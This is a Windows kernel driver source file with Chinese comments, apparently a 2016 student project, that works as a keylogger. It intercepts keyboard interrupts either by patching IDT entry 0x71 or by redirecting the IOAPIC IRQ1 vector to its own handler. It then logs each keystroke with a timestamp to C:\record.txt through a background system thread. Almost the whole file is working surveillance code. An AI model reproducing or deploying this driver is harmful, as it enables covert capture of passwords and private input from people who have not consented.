/*
*******************************************************************************
*= = 文件名称：MyMonitorDriver.c
*= = 文件描述：键盘监控驱动MyMonitorDriver主文件
*= = 作    者：胡默迪小组
*= = 编写时间：2016-07-09 19:18:00
*******************************************************************************
*/

#include "MyMonitorDriver.h"

//*============================================================================ 
//*= = 全局变量 
//*============================================================================

extern void *Origin_address = NULL;

//*============================================================================
//*= = 函数名称：DriverEntry
//*= = 功能描述：驱动程序入口函数 
//*= = 入口参数：PDRIVER_OBJECT, PUNICODE_STRING 
//*= = 出口参数：NTSTATUS
//*============================================================================

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING RegistryPath
	){
	ULONG i;
	DbgPrint(("[*]MyDriver: entering DriverEntry\n"));

	//定时事件
	timer = (PKTIMER)ExAllocatePoolWithTag(NonPagedPool, sizeof (KTIMER), 'INTE');

	if (!timer){
		DbgPrint("[*]Set timer Failed!\n");
		return;
	}
	UNLOAD_FLAG = FALSE;

	Write_to_file(0, "");

	//申请内存
	RecordMemory = ExAllocatePool(NonPagedPool, IRECORD_SIZE);
	memset(RecordMemory, 0, IRECORD_SIZE);

	//注册事件
	//KeInitializeEvent(
	//	&event,
	//	SynchronizationEvent,		//SynchronizationEvent为同步事件  
	//	FALSE						//当是TRUE 时初始化事件是有信号状态.，当是FALSE时初始化事件是没信号状态,如果此处为TRUE,则为有信号状态，KeWaitForSingleObject会直接通过，此时需要调用KeResetEvent来设置为无信号  
	//	);

	//注册线程
	HANDLE threadHandle = NULL;
	NTSTATUS status;
	status=PsCreateSystemThread(	//创建线程  
		&threadHandle,  
		THREAD_ALL_ACCESS,
		NULL,
		NULL,
		NULL,
		RecordThread,				//调用的函数  
		NULL						//PVOID StartContext 传递给函数的参数  
		);
	if (!NT_SUCCESS(status))
		return STATUS_UNSUCCESSFUL;

	ZwClose(threadHandle);

	// 卸载函数。
	DriverObject->DriverUnload = DriverUnload;

#ifdef BUILD_FOR_IDT_HOOK
	HookInt71(TRUE);
#else
	ResetIoApic(TRUE);
#endif
	return  STATUS_SUCCESS;
}

//*============================================================================
//*= = 函数名称：RecordThread
//*= = 功能描述：记录输入至文件的线程函数  
//*= = 入口参数：VOID
//*= = 出口参数：VOID
//*============================================================================

VOID RecordThread() 
{
	DbgPrint("[*]CreateThread Successfully.\n"); 

	UCHAR *Buff;
	LARGE_INTEGER DueTime;
	INT Pos = 0;
	//int length;

	Buff = (PUCHAR)RecordMemory;

	while (1){	
		if (UNLOAD_FLAG)break;

		DueTime.QuadPart = (__int64)1000 * -10000;// run 1s=1000
		KeInitializeTimerEx(timer, NotificationTimer);
		KeSetTimerEx(timer, DueTime, 0, NULL);

		//KdPrint(("[*]MyDriver: Start wait.\r\n"));
		KeWaitForSingleObject(timer, Executive, KernelMode, FALSE, NULL);

		//KdPrint(("[*]MyDriver: End wait.\r\n"));
		////////////////////////////////等待事件///////////////////////////////
		////等待信号  														 //
		//KeWaitForSingleObject(											 //
		//	&event,					//可以为 时间  信号，线程，时钟，互斥对象//  
		//	Executive,				//等待  								 //
		//	KernelMode,				//内核模式								 //
		//	FALSE,															 //
		//	0																 //
		//	);																 //
		//KeResetEvent(&event);		//重置事件								 //
		//////////////////////////////////结束/////////////////////////////////
		//strlen((char *)RecordMemory);

		//循环读内存
		while (Buff[Pos] != 0x00){
			KdPrint(("[*]MyDriver: Write to file.\r\n"));

			CODE_S2K(Buff[Pos]);
			Buff[Pos] = 0x00;

			//pos加1
			Pos = (IRECORD_SIZE - 1 == Pos) ? 0 : Pos + 1;

			//Pos++;
			//if (IRECORD_SIZE == Pos)
			//	Pos = 0;
		}
		//写入文件
		//Write_to_file(0, (char *)RecordMemory);
		DbgPrint("[*]Create Thread has return.\n");
	}//end while

	//释放内存
	ExFreePoolWithTag(timer, 'INTE');
	//创建线程必须用函数PsTerminateSystemThread强制线程结束。否则该线程是无法自动退出的。    
	PsTerminateSystemThread(STATUS_SUCCESS);
}

//*============================================================================
//*= = 函数名称：GetIdt
//*= = 功能描述：用sidt指令读出一个P2C_IDTR结构，并返回IDT的地址
//*= = 入口参数：VOID
//*= = 出口参数：VOID
//*============================================================================

void *GetIdt()
{
	P2C_IDTR idtr;

	// 一句汇编读取到IDT的位置。
	_asm sidt idtr
	return (void *)idtr.base;
}

//*============================================================================
//*= = 函数名称：HookInt71
//*= = 功能描述：修改IDT表中的第0x71项为HookKeyboardInterrupt
//*= = 入口参数：VOID
//*= = 出口参数：VOID
//*============================================================================

void HookInt71(BOOLEAN hook_or_unhook)
{
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)GetIdt();
	idt_addr += 0x71;

	KdPrint(("[*]MyDriver: the current address = %x.\r\n",
		(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high)));

	if (hook_or_unhook){
		KdPrint(("[*]MyDriver: try to hook interrupt.\r\n"));

		// 如果Origin_address是NULL，那么进行hook 保存原地址到Origin_address
		Origin_address = (void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high);
		idt_addr->offset_low = P2C_LOW16_OF_32(MyInterruptProc);
		idt_addr->offset_high = P2C_HIGH16_OF_32(MyInterruptProc);

	}else{
		KdPrint(("[*]MyDriver: try to recovery interrupt.\r\n"));

		// 如果Origin_address不是NULL，那么取消hook.
		idt_addr->offset_low = P2C_LOW16_OF_32(Origin_address);
		idt_addr->offset_high = P2C_HIGH16_OF_32(Origin_address);

	}

	KdPrint(("[*]MyDriver: the current address = %x.\r\n",
		(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high)));
}

//*============================================================================
//*= = 函数名称：GetIdleIdtVec
//*= = 功能描述：在idt表中找到一个空闲的idtentry,新建中断
//*= = 入口参数：VOID
//*= = 出口参数：UCHAR_8
//*============================================================================

UCHAR_8 GetIdleIdtVec()
{
	UCHAR_8 i;
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)GetIdt();

	// 从vec20搜索到2a
	for (i = 0x20; i<0x2a; i++){

		//如果类型为0说明是空闲位置，返回相应id。
		if (idt_addr[i].type == 0){
			return i;
		}
	}
	return 0;
}

//*============================================================================
//*= = 函数名称：CopyIdt71
//*= = 功能描述：拷贝原来的0x71上的idtentry，改变中断处理函数地址
//*= = 入口参数：VOID
//*= = 出口参数：UCHAR_8
//*============================================================================

UCHAR_8 CopyIdt71(UCHAR_8 id, void *interrupt_proc)
{
	//修改idt对应处理函数地址
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)GetIdt();

	idt_addr[id] = idt_addr[0x71];
	idt_addr[id].offset_low = P2C_LOW16_OF_32(interrupt_proc);
	idt_addr[id].offset_high = P2C_HIGH16_OF_32(interrupt_proc);

	return id;
}

//*============================================================================
//*= = 函数名称：SeachOrSetIrq1
//*= = 功能描述：搜索IOAPIC获得键盘中断，或者设置这个值
//*= = 入口参数：UCHAR_8
//*= = 出口参数：UCHAR_8
//*============================================================================

UCHAR_8 SeachOrSetIrq1(UCHAR_8 new_ch)
{
	// 选择寄存器。只使用低8位，其他的位都被保留。
	UCHAR_8 *io_reg_sel;

	// 窗口寄存器，用来读写被选择寄存器选择的值，32位。
	ULONG_16 *io_win;
	ULONG_16 ch, ch1;

	// 定义一个物理地址，这个地址为0xfec00000——IOAPIC寄存器组在Windows上的开始地址
	PHYSICAL_ADDRESS	phys;
	PVOID paddr;
	RtlZeroMemory(&phys, sizeof(PHYSICAL_ADDRESS));
	phys.u.LowPart = 0xfec00000;

	// 物理地址不能直接读写。MmMapIoSpace把物理地址映射为系统空间的虚拟地址。长度为0x14
	paddr = MmMapIoSpace(phys, 0x14, MmNonCached);

	// 如果映射失败则返回0.
	if (!MmIsAddressValid(paddr))
		return 0;

	// 选择寄存器的偏移为0
	io_reg_sel = (UCHAR_8 *)paddr;
	// 窗口寄存器的偏移为0x10.
	io_win = (ULONG_16 *)((UCHAR_8 *)(paddr)+0x10);

	// 选择第0x12，irq1的项
	*io_reg_sel = 0x12;
	ch = *io_win;

	// 如果new_ch不为0，我们就设置新值。并返回旧值。
	if (new_ch != 0)
	{
		ch1 = *io_win;
		ch1 &= 0xffffff00;
		ch1 |= (ULONG_16)new_ch;
		*io_win = ch1;

		KdPrint(("[*]SeachOrSetIrq1:set %2x to irq1.\r\n", (UCHAR_8)new_ch));
	}

	// 窗口寄存器里读出32位的值，我们只需要一个字节。
	//这个字节就是中断向量的值。
	ch &= 0xff;
	MmUnmapIoSpace(paddr, 0x14);

	KdPrint(("[*]SeachOrSetIrq1: the old vec of irq1 is %2x.\r\n", (UCHAR_8)ch));

	return (UCHAR_8)ch;
}

//*============================================================================
//*= = 函数名称：ResetIoApic
//*= = 功能描述：重定位IOAPIC表
//*= = 入口参数：BOOLEAN
//*= = 出口参数：VOID
//*============================================================================

void ResetIoApic(BOOLEAN set_or_recovery)
{
	static UCHAR_8 idle_id = 0;
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)GetIdt();
	UCHAR_8 old_id = 0;

	if (set_or_recovery){
		// 若设置新的ioapic定位，那么需要在Origin_address中保存原函数的入口地址
		idt_addr = (PP2C_IDTENTRY)GetIdt();
		idt_addr += 0x71;
		Origin_address = (void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high);

		// 获得一个空闲位，将irq1处理中断门复制进去。
		// 替换的跳转函数为我们的自己的处理函数。
		idle_id = GetIdleIdtVec();
		if (idle_id != 0){
			CopyIdt71(idle_id, MyInterruptProc);
			// 然后重新定位到这个中断。
			old_id = SeachOrSetIrq1(idle_id);
			// 在32位Windows7下得到中断为0x71。
			ASSERT(old_id == 0x71);
		}
	}else{
		// 恢复原有中断
		old_id = SeachOrSetIrq1(0x71);

		ASSERT(old_id == idle_id);

		// 设置中断门的type = 0使之空闲
		idt_addr[idle_id].type = 0;
	}
}

//*============================================================================
//*= = 函数名称：GetCurTime
//*= = 功能描述：获取当前时间
//*= = 入口参数：NULL
//*= = 出口参数：PWCHAR
//*============================================================================

PCHAR GetCurTime()
{
	LARGE_INTEGER snow, now;
	TIME_FIELDS nowFields;
	static WCHAR timeStr[32] = { 0 };
	static CHAR CtimeStr[32+10] = { 0 };
	int i;


	//获得标准时间
	KeQuerySystemTime(&snow);
	//转换为当地时间
	ExSystemTimeToLocalTime(&snow, &now);
	//转换为人们可以理解的时间格式
	RtlTimeToTimeFields(&now, &nowFields);
	//打印到字符串中
	RtlStringCchPrintfW(
		timeStr,
		32 * 2,
		L"%4d/%d/%d %2d:%2d:%2d    ",
		nowFields.Year, nowFields.Month, nowFields.Day,
		nowFields.Hour, nowFields.Minute, nowFields.Second
		);

	for (i = 0; i < 32; i++)
		CtimeStr[i] = (CHAR)timeStr[i];

	return CtimeStr;
}

//*============================================================================
//*= = 函数名称：MyWrite_to_file
//*= = 功能描述：讲截获信息写入文件保存
//*= = 入口参数：CHAR* , CHAR*
//*= = 出口参数：VOID
//*============================================================================

void Write_to_file(char* file, char* str)
{
	NTSTATUS   status;
	OBJECT_ATTRIBUTES   oa;
	UNICODE_STRING   usname;
	HANDLE   handle;
	IO_STATUS_BLOCK   iostatus;   
	PVOID   buffer;
	ULONG   nbytes;

	static BOOLEAN START_FLAG = TRUE;

	CHAR Buff[IRECORD_SIZE] = { 0 };
	INT i = 0;
	CHAR* CurTime;
	INT Length;

	//初始化目标文件位置
	RtlInitUnicodeString(&usname, L"\\DosDevices\\C:\\record.txt");
	InitializeObjectAttributes(&oa, &usname, OBJ_CASE_INSENSITIVE, NULL, NULL);

	//创建文件句柄
	status = ZwCreateFile(&handle, GENERIC_READ | FILE_APPEND_DATA, 
		&oa, &iostatus, NULL, FILE_ATTRIBUTE_NORMAL, 
		0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	//RtlStringCchCopyA(buf, 30, GetCurTime());

	//写入时间
	CurTime = GetCurTime();
	START_FLAG ? 
		strcat(CurTime, "[Start]"), START_FLAG = FALSE : strcat(CurTime, "[Input]: ");

	//if (START_FLAG){
	//	strcat(CurTime, "[Start]: ");
	//	START_FLAG = FALSE;
	//}
	//else
	//	strcat(CurTime, "[Input]: ");

	Length = strlen(CurTime);
	status = ZwWriteFile(handle, NULL, NULL, NULL, &iostatus, CurTime, Length, NULL, NULL);
	//status = ZwWriteFile(handle, NULL, NULL, NULL, &iostatus, "[Input]: ", 9, NULL, NULL);

	while (str[i]){
		Buff[i] = str[i];
		i++;
	}
	//strcat(Buff, "\r\n");

	//写入内容
	status = ZwWriteFile(handle, NULL, NULL, NULL, &iostatus, Buff, i, NULL, NULL);
	status = ZwWriteFile(handle, NULL, NULL, NULL, &iostatus, "\r\n", 2, NULL, NULL);

	//释放
	ZwClose(handle);
}

#define  DELAY_ONE_MICROSECOND  (-10)
#define  DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
#define  DELAY_ONE_SECOND (DELAY_ONE_MILLISECOND*1000)

//*============================================================================
//*= = 函数名称：MyWrite_to_file
//*= = 功能描述：卸载函数
//*= = 入口参数：CHAR* , CHAR*
//*= = 出口参数：VOID
//*============================================================================

void DriverUnload(PDRIVER_OBJECT drv)
{
	LARGE_INTEGER interval;

	UNLOAD_FLAG = TRUE;

#ifdef BUILD_FOR_IDT_HOOK
	HookInt71(FALSE);
#else
	ResetIoApic(FALSE);
#endif
	DbgPrint(("[*]MyDriver:unloading\n"));

	//内存释放
	ExFreePool((PVOID)RecordMemory);
	//ExFreePoolWithTag(timer, 'INTE');

	// 睡眠5秒。等待所有irp处理结束
	interval.QuadPart = (5 * 1000 * DELAY_ONE_MILLISECOND);
	KeDelayExecutionThread(KernelMode, FALSE, &interval);
}

//*============================================================================
//*= = 文件结束 
//*============================================================================